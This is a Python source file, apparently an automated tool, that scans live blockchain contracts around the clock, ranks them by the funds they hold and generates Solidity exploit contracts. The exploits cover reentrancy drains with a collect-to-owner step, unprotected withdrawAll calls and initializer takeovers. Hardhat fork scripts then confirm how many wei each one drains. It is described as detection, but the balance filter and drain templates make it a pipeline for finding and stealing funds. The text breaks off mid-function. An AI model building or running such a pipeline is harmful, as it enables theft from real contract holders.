#!/usr/bin/env python3
"""
Guardian — Usine de detection de vulnerabilites automatisee 24/7
=================================================================
Tourne en continu sur toutes les blockchains, detecte les contrats,
verifie le code source, scanne les failles, valide sur Hardhat,
et ne s'arrete jamais tant qu'une exploitation n'est pas confirmee.

Architecture:
  - Utilise l'orchestrator existant avec un callback propre (pas de hack)
  - Stocke tout dans SQLite (FindingsDB)
  - Valide les findings sur Hardhat fork de maniere asynchrone
  - Ne s'arrete JAMAIS sur un finding (auto_stop_enabled=False)

Usage:
    python guardian.py                          # Demarrer l'usine
    python guardian.py --status                 # Voir l'etat de la base
    python guardian.py --report                 # Exporter le rapport
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import signal
import sqlite3
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Optional

import yaml

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scanner.orchestrator import ScannerOrchestrator
from analysis.vulnerability_scanner import VulnerabilityFinding
from exploit_pipeline import ExploitPipeline, CHAIN_REGISTRY

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [GUARDIAN] %(levelname)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("guardian")

# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class ContractRecord:
    address: str
    chain_id: int
    chain_name: str
    name: str = "Unknown"
    verified: bool = False
    source_length: int = 0
    sol_version: Optional[str] = None
    scanned_at: Optional[str] = None
    finding_count: int = 0
    exploitable_count: int = 0
    hardhat_tested: bool = False
    hardhat_confirmed: bool = False
    bnb_balance: float = 0.0

@dataclass
class FindingRecord:
    contract_addr: str
    chain_id: int
    finding_name: str
    severity: str
    line_numbers: list[int]
    exploitable: bool
    exploit_notes: str = ""
    hardhat_result: Optional[str] = None  # None, "PENDING", "FAILED", "CONFIRMED"
    hardhat_evidence: str = ""
    created_at: str = ""

# ---------------------------------------------------------------------------
# SQLite Persistence
# ---------------------------------------------------------------------------

class FindingsDB:
    """SQLite-based persistence for contracts and findings."""

    def __init__(self, db_path: str = "guardian_data.db"):
        self.db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), db_path)
        self._conn: Optional[sqlite3.Connection] = None

    def connect(self):
        if self._conn is None:
            self._conn = sqlite3.connect(self.db_path)
            self._conn.row_factory = sqlite3.Row
            self._create_tables()
        return self._conn

    def _create_tables(self):
        cur = self._conn.cursor()
        cur.executescript("""
            CREATE TABLE IF NOT EXISTS contracts (
                address TEXT NOT NULL,
                chain_id INTEGER NOT NULL,
                chain_name TEXT,
                name TEXT DEFAULT 'Unknown',
                verified INTEGER DEFAULT 0,
                source_length INTEGER DEFAULT 0,
                sol_version TEXT,
                scanned_at TEXT,
                finding_count INTEGER DEFAULT 0,
                exploitable_count INTEGER DEFAULT 0,
                hardhat_tested INTEGER DEFAULT 0,
                hardhat_confirmed INTEGER DEFAULT 0,
                bnb_balance REAL DEFAULT 0.0,
                PRIMARY KEY (address, chain_id)
            );

            CREATE TABLE IF NOT EXISTS findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                contract_addr TEXT NOT NULL,
                chain_id INTEGER NOT NULL,
                finding_name TEXT NOT NULL,
                severity TEXT NOT NULL,
                line_numbers TEXT,
                exploitable INTEGER DEFAULT 0,
                exploit_notes TEXT,
                hardhat_result TEXT,
                hardhat_evidence TEXT,
                created_at TEXT,
                FOREIGN KEY (contract_addr, chain_id) REFERENCES contracts(address, chain_id)
            );

            CREATE TABLE IF NOT EXISTS scan_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                event_type TEXT,
                chain_name TEXT,
                message TEXT
            );

            CREATE INDEX IF NOT EXISTS idx_findings_severity ON findings(severity);
            CREATE INDEX IF NOT EXISTS idx_findings_exploitable ON findings(exploitable);
            CREATE INDEX IF NOT EXISTS idx_findings_hardhat ON findings(hardhat_result);
        """)
        self._conn.commit()

    def upsert_contract(self, contract: ContractRecord):
        conn = self.connect()
        conn.execute("""
            INSERT OR REPLACE INTO contracts
            (address, chain_id, chain_name, name, verified, source_length,
             sol_version, scanned_at, finding_count, exploitable_count,
             hardhat_tested, hardhat_confirmed, bnb_balance)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            contract.address, contract.chain_id, contract.chain_name,
            contract.name, int(contract.verified), contract.source_length,
            contract.sol_version, contract.scanned_at,
            contract.finding_count, contract.exploitable_count,
            int(contract.hardhat_tested), int(contract.hardhat_confirmed),
            contract.bnb_balance
        ))
        conn.commit()

    def add_finding(self, finding: FindingRecord):
        conn = self.connect()
        conn.execute("""
            INSERT INTO findings
            (contract_addr, chain_id, finding_name, severity, line_numbers,
             exploitable, exploit_notes, hardhat_result, hardhat_evidence, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            finding.contract_addr, finding.chain_id, finding.finding_name,
            finding.severity, json.dumps(finding.line_numbers),
            int(finding.exploitable), finding.exploit_notes,
            finding.hardhat_result, finding.hardhat_evidence,
            finding.created_at
        ))
        conn.commit()

    def update_hardhat_result(self, contract_addr: str, chain_id: int,
                               finding_name: str, result: str, evidence: str = ""):
        conn = self.connect()
        conn.execute("""
            UPDATE findings SET hardhat_result = ?, hardhat_evidence = ?
            WHERE contract_addr = ? AND chain_id = ? AND finding_name = ?
        """, (result, evidence, contract_addr, chain_id, finding_name))
        conn.execute("""
            UPDATE contracts SET hardhat_tested = 1,
                hardhat_confirmed = CASE WHEN ? = 'CONFIRMED' THEN 1 ELSE 0 END
            WHERE address = ? AND chain_id = ?
        """, (result, contract_addr, chain_id))
        conn.commit()

    def get_contract(self, address: str, chain_id: int) -> Optional[dict]:
        conn = self.connect()
        cur = conn.execute(
            "SELECT * FROM contracts WHERE address = ? AND chain_id = ?",
            (address, chain_id)
        )
        row = cur.fetchone()
        return dict(row) if row else None

    def is_scanned(self, address: str, chain_id: int) -> bool:
        return self.get_contract(address, chain_id) is not None

    def get_exploitable_not_tested(self) -> list[dict]:
        conn = self.connect()
        cur = conn.execute("""
            SELECT * FROM findings
            WHERE exploitable = 1 AND (hardhat_result IS NULL OR hardhat_result = 'PENDING')
            ORDER BY
                CASE severity
                    WHEN 'CRITICAL' THEN 0
                    WHEN 'HIGH' THEN 1
                    ELSE 2
                END
        """)
        return [dict(r) for r in cur.fetchall()]

    def get_stats(self) -> dict:
        conn = self.connect()
        stats = {}
        cur = conn.execute("SELECT COUNT(*) as c FROM contracts")
        stats["contracts_total"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM contracts WHERE verified = 1")
        stats["contracts_verified"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings")
        stats["findings_total"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings WHERE exploitable = 1")
        stats["findings_exploitable"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings WHERE hardhat_result = 'CONFIRMED'")
        stats["exploits_confirmed"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings WHERE hardhat_result = 'FAILED'")
        stats["exploits_failed"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings WHERE hardhat_result IS NULL AND exploitable = 1")
        stats["exploits_pending"] = cur.fetchone()[0]
        return stats

    def log_event(self, event_type: str, chain_name: str, message: str):
        conn = self.connect()
        conn.execute(
            "INSERT INTO scan_log (timestamp, event_type, chain_name, message) VALUES (?, ?, ?, ?)",
            (datetime.utcnow().isoformat(), event_type, chain_name, message[:500])
        )
        conn.commit()

    def close(self):
        if self._conn:
            self._conn.close()
            self._conn = None

# ---------------------------------------------------------------------------
# Hardhat Reproduction Engine (REAL fork testing)
# ---------------------------------------------------------------------------

class HardhatValidator:
    """Validates exploitable findings by forking the chain with Hardhat.

    For each exploitable finding:
    1. Creates a Hardhat config that forks the target chain at a recent block
    2. Deploys an exploit contract (generated per finding type)
    3. Attempts the exploit
    4. Checks if state changed (balance, storage) => CONFIRMED or FAILED
    """

    # RPC URLs for forking — derived from exploit_pipeline.CHAIN_REGISTRY
    RPC_URLS = {k: v[2] for k, v in CHAIN_REGISTRY.items()}

    def __init__(self, db: FindingsDB, exploit_dir: str = ""):
        self.db = db
        self.exploit_dir = exploit_dir or os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "exploit"
        )
        os.makedirs(self.exploit_dir, exist_ok=True)

    def _generate_exploit_contract(self, target_addr: str, finding_name: str, finding_type: str) -> str:
        """Generate a Solidity exploit contract for a given finding type.

        Returns the Solidity source code as a string.
        """
        # Common exploit template with different attack patterns
        timestamp = int(datetime.utcnow().timestamp())

        if "reentrancy" in finding_type.lower():
            return (
                f"// SPDX-License-Identifier: UNLICENSED\n"
                f"pragma solidity ^0.8.0;\n\n"
                f"interface ITarget {{\n"
                f"    function withdraw(uint256 amount) external;\n"
                f"    function deposit() external payable;\n"
                f"}}\n\n"
                f"contract Exploit_{timestamp} {{\n"
                f"    ITarget public target;\n"
                f"    address public owner;\n"
                f"    uint256 public round;\n"
                f"    uint256 public constant MAX_ROUNDS = 10;\n\n"
                f"    constructor(address _target) {{\n"
                f"        target = ITarget(_target);\n"
                f"        owner = msg.sender;\n"
                f"    }}\n\n"
                f"    function attack() external payable {{\n"
                f"        require(msg.sender == owner, \"!owner\");\n"
                f"        round = 0;\n"
                f"        target.deposit{{value: msg.value}}();\n"
                f"        target.withdraw(msg.value);\n"
                f"    }}\n\n"
                f"    receive() external payable {{\n"
                f"        if (round < MAX_ROUNDS) {{\n"
                f"            round++;\n"
                f"            target.withdraw(msg.value);\n"
                f"        }}\n"
                f"    }}\n\n"
                f"    function collect() external {{\n"
                f"        require(msg.sender == owner, \"!owner\");\n"
                f"        payable(owner).transfer(address(this).balance);\n"
                f"    }}\n"
                f"}}\n"
            )

        elif "withdraw" in finding_type.lower() or "unprotected" in finding_type.lower():
            return (
                f"// SPDX-License-Identifier: UNLICENSED\n"
                f"pragma solidity ^0.8.0;\n\n"
                f"interface ITarget {{\n"
                f"    function withdraw(uint256 amount) external;\n"
                f"    function withdrawAll() external;\n"
                f"}}\n\n"
                f"contract Exploit_{timestamp} {{\n"
                f"    ITarget public target;\n"
                f"    address public owner;\n\n"
                f"    constructor(address _target) {{\n"
                f"        target = ITarget(_target);\n"
                f"        owner = msg.sender;\n"
                f"    }}\n\n"
                f"    function attack() external {{\n"
                f"        require(msg.sender == owner, \"!owner\");\n"
                f"        target.withdrawAll();\n"
                f"    }}\n\n"
                f"    function collect() external {{\n"
                f"        require(msg.sender == owner, \"!owner\");\n"
                f"        payable(owner).transfer(address(this).balance);\n"
                f"    }}\n"
                f"}}\n"
            )

        elif "initializer" in finding_type.lower() or "init" in finding_type.lower():
            return (
                f"// SPDX-License-Identifier: UNLICENSED\n"
                f"pragma solidity ^0.8.0;\n\n"
                f"interface ITarget {{\n"
                f"    function initialize(address _owner) external;\n"
                f"}}\n\n"
                f"contract Exploit_{timestamp} {{\n"
                f"    ITarget public target;\n\n"
                f"    constructor(address _target) {{\n"
                f"        target = ITarget(_target);\n"
                f"    }}\n\n"
                f"    function attack() external {{\n"
                f"        target.initialize(address(this));\n"
                f"    }}\n"
                f"}}\n"
            )

        else:
            return (
                f"// SPDX-License-Identifier: UNLICENSED\n"
                f"pragma solidity ^0.8.0;\n\n"
                f"contract Exploit_{timestamp} {{\n"
                f"    address public target;\n\n"
                f"    constructor(address _target) {{\n"
                f"        target = _target;\n"
                f"    }}\n\n"
                f"    function attack() external pure returns (string memory) {{\n"
                f"        return \"Generic exploit for \";\n"
                f"    }}\n"
                f"}}\n"
            )

    def _generate_hardhat_script(self, target_addr: str, exploit_file: str,
                                  rpc_url: str, finding_type: str) -> str:
        """Generate a Hardhat JavaScript test script that:
        1. Forks the chain
        2. Deploys the exploit
        3. Attempts the attack
        4. Reports success/failure
        """
        return f"""
const hre = require("hardhat");

async function main() {{
    // Fork the chain
    await hre.network.provider.request({{
        method: "hardhat_reset",
        params: [{{
            forking: {{
                jsonRpcUrl: "{rpc_url}",
                blockNumber: await getLatestBlock()
            }}
        }}]
    }});

    // Get target contract balance before
    const targetAddr = "{target_addr}";
    const beforeBal = await hre.network.provider.send("eth_getBalance", [targetAddr, "latest"]);
    console.log("Target balance before:", BigInt(beforeBal).toString());

    // Deploy exploit
    const Exploit = await hre.ethers.getContractFactory("Exploit");
    const exploit = await Exploit.deploy(targetAddr);
    await exploit.waitForDeployment();
    console.log("Exploit deployed at:", await exploit.getAddress());

    // Attempt attack
    try {{
        const tx = await exploit.attack({{ gasLimit: 500000 }});
        await tx.wait();
        console.log("Attack transaction succeeded");
    }} catch (e) {{
        console.log("Attack failed:", e.message);
        process.exit(1);
    }}

    // Check if state changed
    const afterBal = await hre.network.provider.send("eth_getBalance", [targetAddr, "latest"]);
    console.log("Target balance after:", BigInt(afterBal).toString());

    const beforeVal = BigInt(beforeBal);
    const afterVal = BigInt(afterBal);
    if (afterVal < beforeVal) {{
        const drained = beforeVal - afterVal;
        console.log("EXPLOIT CONFIRMED: Drained", drained.toString(), "wei");
        process.exit(0);
    }} else {{
        console.log("EXPLOIT FAILED: No funds drained");
        process.exit(2);
    }}
}}

async function getLatestBlock() {{
    const block = await hre.network.provider.send("eth_blockNumber", []);
    return parseInt(block, 16);
}}

main().catch(e => {{
    console.error("Script error:", e.message);
    process.exit(1);
}});
"""

    async def _check_hardhat_available(self) -> bool:
        """Check if Hardhat (npx hardhat) is available."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "npx", "hardhat", "--version",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            code = await proc.wait()
            return code == 0
        except FileNotFoundError:
            return False

    async def validate_finding(self, finding: dict) -> tuple[bool, str]:
        """Try to validate an exploitable finding on Hardhat fork.

        Returns:
            (confirmed: bool, evidence: str)
        """
        contract_addr = finding["contract_addr"]
        chain_id = finding["chain_id"]
        finding_name = finding["finding_name"]
        finding_type = finding.get("finding_name", "")
        severity = finding["severity"]

        logger.info(f"[HARDHAT] Testing {finding_name} [{severity}] on {contract_addr[:14]}..")

        self.db.update_hardhat_result(
            contract_addr, chain_id, finding_name, "PENDING",
            f"Testing started at {datetime.utcnow().isoformat()}"
        )

        # Step 1: Check Hardhat availability
        hardhat_ok = await self._check_hardhat_available()
        if not hardhat_ok:
            evidence = "Hardhat not installed. Run: npm install -g hardhat"
            self.db.update_hardhat_result(contract_addr, chain_id, finding_name, "FAILED", evidence)
            return False, evidence

        # Step 2: Get RPC URL
        rpc_url = self.RPC_URLS.get(chain_id)
        if not rpc_url:
            evidence = f"No RPC URL for chain {chain_id}"
            self.db.update_hardhat_result(contract_addr, chain_id, finding_name, "FAILED", evidence)
            return False, evidence

        # Step 3: Create temp exploit project
        work_dir = os.path.join(tempfile.gettempdir(), f"guardian_exploit_{contract_addr[:10]}")
        os.makedirs(work_dir, exist_ok=True)

        try:
            # Write exploit contract
            exploit_sol = self._generate_exploit_contract(contract_addr, finding_name, finding_type)
            exploit_file = os.path.join(work_dir, "Exploit.sol")
            with open(exploit_file, "w") as f:
                f.write(exploit_sol)

            # Write Hardhat test script
            test_js = self._generate_hardhat_script(contract_addr, exploit_file, rpc_url, finding_type)
            test_file = os.path.join(work_dir, "test_exploit.js")
            with open(test_file, "w") as f:
                f.write(test_js)

            # Write minimal hardhat.config.js if not exists
            hh_config = os.path.join(work_dir, "hardhat.config.js")
            if not os.path.exists(hh_config):
                with open(hh_config, "w") as f:
                    f.write("""
module.exports = {
    solidity: "0.8.20",
    networks: {
        hardhat: {
            forking: {
                enabled: false,  // We'll set it in the test
            }
        }
    }
};
""")

            # Write package.json if not exists
            pkg_json = os.path.join(work_dir, "package.json")
            if not os.path.exists(pkg_json):
                with open(pkg_json, "w") as f:
                    json.dump({
                        "name": f"guardian-test-{contract_addr[:10]}",
                        "scripts": {"test": "npx hardhat run test_exploit.js"},
                        "devDependencies": {
                            "hardhat": "^2.19.0",
                            "@nomicfoundation/hardhat-ethers": "^3.0.0",
                            "ethers": "^6.0.0"
                        }
                    }, f, indent=2)

            # Step 4: Install dependencies (skip if node_modules exists)
            node_modules = os.path.join(work_dir, "node_modules")
            if not os.path.exists(node_modules):
                logger.info(f"[HARDHAT] Installing deps in {work_dir[:50]}...")
                install_proc = await asyncio.create_subprocess_exec(
                    "npm", "install", "--no-audit", "--no-fund",
                    cwd=work_dir,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                await install_proc.wait()

            # Step 5: Run the exploit test
            logger.info(f"[HARDHAT] Running exploit test for {contract_addr[:14]}..")
            test_proc = await asyncio.create_subprocess_exec(
                "npx", "hardhat", "run", "test_exploit.js",
                cwd=work_dir,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            stdout, _ = await asyncio.wait_for(test_proc.communicate(), timeout=120)

            output = stdout.decode("utf-8", errors="replace")
            evidence = output[:2000]

            # Step 6: Parse result
            if "EXPLOIT CONFIRMED" in output:
                logger.critical(f"[!!!] EXPLOIT CONFIRMED on {contract_addr[:14]}.. via {finding_name}!")
                self.db.update_hardhat_result(
                    contract_addr, chain_id, finding_name, "CONFIRMED", evidence
                )
                return True, evidence
            elif "EXPLOIT FAILED" in output:
                logger.info(f"[HARDHAT] {finding_name}: NOT exploitable (no funds drained)")
                self.db.update_hardhat_result(
                    contract_addr, chain_id, finding_name, "FAILED", evidence
                )
                return False, evidence
            else:
                # Unknown result - might have errored
                error_msg = f"Unexpected Hardhat output: {output[:500]}"
                logger.warning(f"[HARDHAT] {error_msg}")
                self.db.update_hardhat_result(
                    contract_addr, chain_id, finding_name, "FAILED", evidence
                )
                return False, error_msg

        except asyncio.TimeoutError:
            evidence = "Hardhat test timed out after 120s"
            self.db.update_hardhat_result(contract_addr, chain_id, finding_name, "FAILED", evidence)
            return False, evidence
        except Exception as e:
            error_msg = f"Hardhat validation error: {e}"
            logger.error(f"[HARDHAT] {error_msg}")
            self.db.update_hardhat_result(contract_addr, chain_id, finding_name, "FAILED", error_msg)
            return False, error_msg
        finally:
            # Cleanup temp files
            try:
                import shutil
                shutil.rmtree(work_dir, ignore_errors=True)
            except Exception:
                pass

    async def validate_all_pending(self) -> list[dict]:
        """Validate all pending exploitable findings (runs sequentially)."""
        pending = self.db.get_exploitable_not_tested()
        results = []
        for finding in pending:
            confirmed, evidence = await self.validate_finding(finding)
            results.append({
                "contract": finding["contract_addr"],
                "finding": finding["finding_name"],
                "result": "CONFIRMED" if confirmed else "FAILED",
                "evidence": evidence[:200],
            })
        return results

# ---------------------------------------------------------------------------
# Guardian — Main Engine (clean callback architecture)
# ---------------------------------------------------------------------------

class Guardian:
    """The main guardian engine — runs continuously on all chains.

    Architecture:
      - Creates ScannerOrchestrator with:
          * on_contract_checked callback for DB persistence
          * auto_stop_enabled=False (never stops on vulnerability)
      - Handles all DB persistence internally
      - Validates exploitable findings via HardhatValidator
    """

    def __init__(self, config_path: str = "config.yaml"):
        self.config_path = config_path
        self.config = self._load_config()
        self.db = FindingsDB()
        self.hardhat = HardhatValidator(self.db)
        self.orchestrator: Optional[ScannerOrchestrator] = None
        self.running = False
        self.stop_event = asyncio.Event()
        self._exploit_pipeline: Optional[ExploitPipeline] = None

        # Stats (cumulative across runs)
        self.stats = {
            "started_at": None,
            "contracts_checked": 0,
            "vulns_found": 0,
            "exploits_confirmed": 0,
            "chains_active": 0,
        }

    def _load_config(self) -> dict:
        if not os.path.exists(self.config_path):
            logger.error(f"Config not found: {self.config_path}")
            sys.exit(1)
        with open(self.config_path, "r", encoding="utf-8") as f:
            return yaml.safe_load(f) or {}

    async def _on_unverified_contract(
        self, address: str, chain_id: int, chain_name: str
    ) -> None:
        """Called when a non-verified contract is detected by the orchestrator."""
        addr = address.lower()
        if self.db.is_scanned(addr, chain_id):
            return
        contract = ContractRecord(
            address=addr, chain_id=chain_id, chain_name=chain_name,
            verified=False, scanned_at=datetime.utcnow().isoformat(),
        )
        self.db.upsert_contract(contract)
        self.stats["contracts_checked"] += 1
        logger.info(f"[DETECT] Non-verified: {addr[:14]}.. on {chain_name}")

    async def _on_contract_checked(
        self,
        address: str,
        chain_id: int,
        chain_name: str,
        findings: list[VulnerabilityFinding],
        source_code: str,
    ) -> None:
        """Callback invoked by orchestrator when a verified contract is scanned.

        This is the CLEAN integration point — no hacky queue manipulation needed.
        """
        addr = address.lower()

        # Skip if already in DB (orchestrator caches scans, but we double-check)
        if self.db.is_scanned(addr, chain_id):
            return

        logger.info(f"[GUARDIAN] Processing {addr[:14]}.. ({len(findings)} findings)")

        # Run exploit pipeline using ALREADY FETCHED source (no duplicate Etherscan API call)
        try:
            if not self._exploit_pipeline:
                api_key = self.config.get("global", {}).get("explorer_api_key", "")
                self._exploit_pipeline = ExploitPipeline(api_key=api_key)

            # Use cached source from orchestrator — avoids re-fetching from Etherscan
            report = await self._exploit_pipeline.run_for_address(
                addr, chain_id, chain_name, cached_source=source_code
            )
        except Exception as e:
            logger.error(f"[GUARDIAN] Pipeline error for {addr[:14]}..: {e}")
            report = None

        # Build contract record
        contract = ContractRecord(
            address=addr,
            chain_id=chain_id,
            chain_name=chain_name,
            name=report.contract_name if report else "Unknown",
            verified=True,
            source_length=len(source_code),
            sol_version=report.solidity_version if report else None,
            scanned_at=datetime.utcnow().isoformat(),
            finding_count=len(findings),
        )

        # Get native balance (using CHAIN_REGISTRY from exploit_pipeline)
        try:
            import httpx
            chain_info = CHAIN_REGISTRY.get(chain_id)
            rpc = chain_info[2] if chain_info else None
            if rpc:
                async with httpx.AsyncClient(timeout=10) as c:
                    r = await c.post(rpc, json={
                        "jsonrpc": "2.0", "method": "eth_getBalance",
                        "params": [addr, "latest"], "id": 1
                    })
                    bal = int(r.json().get("result", "0"), 16) / 1e18
                    contract.bnb_balance = bal
        except Exception:
            pass

        self.db.upsert_contract(contract)
        self.stats["contracts_checked"] += 1

        # Store findings from the pipeline (more detailed than orchestrator's)
        if report and report.findings:
            found_exploitable = False
            for finding, validation in zip(report.findings, report.validations):
                finding_record = FindingRecord(
                    contract_addr=addr, chain_id=chain_id,
                    finding_name=finding.name, severity=finding.severity,
                    line_numbers=finding.line_numbers,
                    exploitable=validation.theoretically_exploitable,
                    exploit_notes=validation.exploit_notes,
                    created_at=datetime.utcnow().isoformat(),
                )
                self.db.add_finding(finding_record)

                if validation.theoretically_exploitable:
                    found_exploitable = True
                    contract.exploitable_count += 1
                    self.stats["vulns_found"] += 1
                    logger.warning(
                        f"[VULN] {finding.severity}: {finding.name} "
                        f"sur {addr[:14]}.. — EXPLOITABLE! (bal: {contract.bnb_balance:.4f})"
                    )

            # Update contract with exploitable count
            if found_exploitable:
                self.db.upsert_contract(contract)

            # Auto-validate on Hardhat if exploitable AND has balance
            if found_exploitable and contract.bnb_balance > 0.001:
                logger.info(f"[HARDHAT] Auto-validating on {contract.bnb_balance:.4f} native tokens...")
                results = await self.hardhat.validate_all_pending()
                for r in results:
                    if r["result"] == "CONFIRMED":
                        self.stats["exploits_confirmed"] += 1
                        self.db.log_event("EXPLOIT", chain_name,
                            f"CONFIRMED on {r['contract']} via {r['finding']}: {r['evidence'][:200]}")
                        logger.critical(
                            f"[!!!] EXPLOIT CONFIRMED on {r['contract'][:14]}.. "
                            f"via {r['finding']}! Evidence: {r['evidence'][:200]}"
                        )
                        # Write to alarm file
                        alarm_path = os.path.join(
                            os.path.dirname(os.path.abspath(__file__)),
                            "guardian_exploits_found.txt"
                        )
                        with open(alarm_path, "a") as f:
                            f.write(f"\n{'='*60}")
                            f.write(f"\n[!!!] EXPLOIT CONFIRMED at {datetime.utcnow().isoformat()}")
                            f.write(f"\nContract: {r['contract']}")
                            f.write(f"\nChain: {chain_name} ({chain_id})")
                            f.write(f"\nFinding: {r['finding']}")
                            f.write(f"\nBalance: {contract.bnb_balance:.4f}")
                            f.write(f"\nEvidence: {r['evidence']}")
                            f.write(f"\n{'='*60}\n")
            elif found_exploitable:
                logger.info(f"[HARDHAT] Skipping validation: balance = {contract.bnb_balance:.4f} (< 0.001)")

    async def start(self):
        """Start the guardian — runs forever until interrupted."""
        logger.info("=" * 60)
        logger.info("  GUARDIAN — Usine de detection automatisee 24/7")
        logger.info("=" * 60)
        logger.info(f"  Base de donnees: {self.db.db_path}")
        logger.info(f"  Demarrage: {datetime.utcnow().isoformat()}")
        logger.info("=" * 60)

        self.stats["started_at"] = datetime.utcnow().isoformat()
        self.running = True

        # Connect to DB
        self.db.connect()
        self.db.log_event("START", "all", "Guardian started")

        # Enable all chains
        for chain_key in self.config.get("chains", {}):
            self.config["chains"][chain_key]["enabled"] = True

        # Create orchestrator with clean callbacks (NO auto-stop, NO hacky overrides)
        self.orchestrator = ScannerOrchestrator(
            config=self.config,
            on_contract_checked=self._on_contract_checked,
            on_unverified_contract=self._on_unverified_contract,
            auto_stop_enabled=False,
        )

        # Start orchestrator (creates single _process_events task — NO DUAL READ)
        await self.orchestrator.start()

        # Set up signal handlers
        try:
            loop = asyncio.get_running_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self.stop()))
        except (NotImplementedError, AttributeError):
            pass

        # Periodic stats display
        async def show_stats():
            while self.running:
                await asyncio.sleep(60)
                stats = self.db.get_stats()
                logger.info(
                    f"[STATS] Contracts: {stats['contracts_total']} | "
                    f"Vérifiés: {stats['contracts_verified']} | "
                    f"Findings: {stats['findings_total']} | "
                    f"Exploitables: {stats['findings_exploitable']} | "
                    f"Hardhat tests: {stats['exploits_confirmed'] + stats['exploits_failed']} | "
                    f"Confirmés: {stats['exploits_confirmed']}"
                )

        stats_task = asyncio.create_task(show_stats())

        try:
            # Wait FOREVER — no stop on vulnerability!
            logger.info("[GUARDIAN] Running. Press Ctrl+C to stop.")
            await self.stop_event.wait()
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt received...")
        finally:
            stats_task.cancel()
            await self.stop()

    async def stop(self):
        """Graceful shutdown."""
        logger.info("Shutting down Guardian...")
        self.running = False
        self.stop_event.set()

        if self.orchestrator:
            await self.orchestrator.stop()
        if self._exploit_pipeline:
            await self._exploit_pipeline.close()

        self.db.log_event("STOP", "all", "Guardian stopped")

        # Print final stats
        stats = self.db.get_stats()
        logger.info("=" * 60)
        logger.info("  GUARDIAN — RAPPORT FINAL")
        logger.info("=" * 60)
        logger.info(f"  Contrats scannes: {stats['contracts_total']}")
        logger.info(f"  Verifies: {stats['contracts_verified']}")
        logger.info(f"  Findings totaux: {stats['findings_total']}")
        logger.info(f"  Exploitables: {stats['findings_exploitable']}")
        logger.info(f"  Tests Hardhat: {stats['exploits_confirmed'] + stats['exploits_failed']}")
        logger.info(f"  Confirmes: {stats['exploits_confirmed']}")
        logger.info(f"  Echoues: {stats['exploits_failed']}")
        logger.info(f"  En attente: {stats['exploits_pending']}")
        logger.info("=" * 60)

        if stats['exploits_confirmed'] > 0:
            logger.critical(f"[!!!] {stats['exploits_confirmed']} EXPLOIT(S) CONFIRME(S) !")
            alarm_path = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                "guardian_exploits_found.txt"
            )
            if os.path.exists(alarm_path):
                with open(alarm_path, "r") as f:
                    print(f.read())

        self.db.close()
        logger.info("[DONE] Guardian stopped. Goodbye!")

    def print_status(self):
        """Print current status from database."""
        if not os.path.exists(self.db.db_path):
            print("[GUARDIAN] Database not found. Start guardian first.")
            return

        self.db.connect()
        stats = self.db.get_stats()
        print(f"\n{'='*60}")
        print(f"  GUARDIAN — STATUS")
        print(f"{'='*60}")
        print(f"  Contrats dans la base: {stats['contracts_total']}")
        print(f"  Contrats verifies: {stats['contracts_verified']}")
        print(f"  Findings: {stats['findings_total']}")
        print(f"  Exploitables: {stats['findings_exploitable']}")
        print(f"  Testes Hardhat: {stats['exploits_confirmed'] + stats['exploits_failed']}")
        print(f"  Confirmes: {stats['exploits_confirmed']}")
        print(f"  Echoues: {stats['exploits_failed']}")
        print(f"  En attente: {stats['exploits_pending']}")
        print(f"{'='*60}\n")

        pending = self.db.get_exploitable_not_tested()
        if pending:
            print(f"  Findings exploitables en attente de test Hardhat ({len(pending)}):")
            for f in pending[:10]:
                print(f"    [{f['severity']}] {f['finding_name'][:50]:50s} "
                     f"sur {f['contract_addr'][:14]}..")
            if len(pending) > 10:
                print(f"    ... et {len(pending) - 10} autre(s)")
            print()
        self.db.close()

    def print_report(self):
        """Export a full report."""
        self.print_status()

    @staticmethod
    def check_health():
        """Health check for 24/7 monitoring.

        Checks:
        - PID file exists and process is alive
        - Database exists and has recent activity
        - Log file has recent writes

        Returns exit code 0 if healthy, 1 otherwise.
        """
        base_dir = os.path.dirname(os.path.abspath(__file__))
        pid_file = os.path.join(base_dir, "guardian.pid")
        db_file = os.path.join(base_dir, "guardian_data.db")
        log_file = os.path.join(base_dir, "guardian_output.log")

        issues = []
        healthy = True

        print(f"\n{'='*60}")
        print("  GUARDIAN — HEALTH CHECK")
        print(f"{'='*60}")

        # 1. Check PID file and process
        print("\n  [1/3] Process...")
        if os.path.exists(pid_file):
            with open(pid_file) as f:
                pid = f.read().strip()
            if pid and pid.isdigit():
                pid_int = int(pid)
                alive = False
                try:
                    if sys.platform == "win32":
                        import subprocess
                        r = subprocess.run(["tasklist", "/FI", f"PID eq {pid_int}"],
                                          capture_output=True, text=True, timeout=5)
                        alive = "python" in r.stdout.lower()
                    else:
                        # Unix/macOS: kill with signal 0 checks if process exists
                        os.kill(pid_int, 0)
                        alive = True
